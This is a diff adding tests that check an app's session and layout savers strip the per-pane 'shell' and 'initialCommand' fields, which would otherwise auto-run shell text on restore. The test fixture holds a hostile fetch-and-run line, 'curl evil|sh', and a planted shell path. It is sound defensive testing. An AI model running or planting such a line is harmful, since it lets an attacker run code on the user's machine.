@@ -1163,4 +1163,55 @@ describe('boot-restore documents are scrubbed by every writer, not just layout.s
       "the scrub rewrote an in-flight RPC's params in place — a different bug",
     ).toBe(true);
   });
+
+  // The agent-level scrub above never reached the terminal-pane host-exec fields
+  // one level down, inside agents[].tabs[].panes[]. A restored terminal pane's
+  // `shell` is argv[0] of the LOCAL terminal:create door (no allowlist), and its
+  // `initialCommand` is typed into the ready PTY with a trailing CR — arbitrary
+  // shell text auto-run on the desktop's next launch.
+  const paneHostile = {
+    id: 'a1',
+    cwd: '/',
+    provider: 'claude',
+    tabs: [
+      {
+        id: 't1',
+        title: 'T',
+        panes: [
+          {
+            id: 'p1',
+            type: 'terminal',
+            title: 'sh',
+            shell: '/tmp/attacker-planted',
+            initialCommand: 'curl evil|sh',
+          },
+        ],
+      },
+    ],
+  };
+
+  it('sessions.save strips per-pane host-execution fields (shell / initialCommand)', () => {
+    call('sessions.save', { name: 'restored', activeAgentId: 'a1', agents: [{ ...paneHostile }] });
+    const doc = savedSessions[0] as { agents: any[] };
+    const pane = doc.agents[0].tabs[0].panes[0];
+    expect(
+      pane,
+      'a restored terminal pane spawns `shell` through the LOCAL terminal:create door, which allowlists nothing',
+    ).not.toHaveProperty('shell');
+    expect(
+      pane,
+      'initialCommand is typed into the ready PTY with a CR — arbitrary shell auto-run on restore',
+    ).not.toHaveProperty('initialCommand');
+    // FLOOR: the pane survives as a usable terminal minus the exec sinks.
+    expect(pane).toMatchObject({ id: 'p1', type: 'terminal' });
+  });
+
+  it('layouts.save strips per-pane host-execution fields too', () => {
+    call('layouts.save', { name: 'tpl', agents: [{ ...paneHostile }] });
+    const doc = savedLayouts[0] as { agents: any[] };
+    const pane = doc.agents[0].tabs[0].panes[0];
+    expect(pane).not.toHaveProperty('shell');
+    expect(pane).not.toHaveProperty('initialCommand');
+    expect(pane).toMatchObject({ id: 'p1' });
+  });
 });
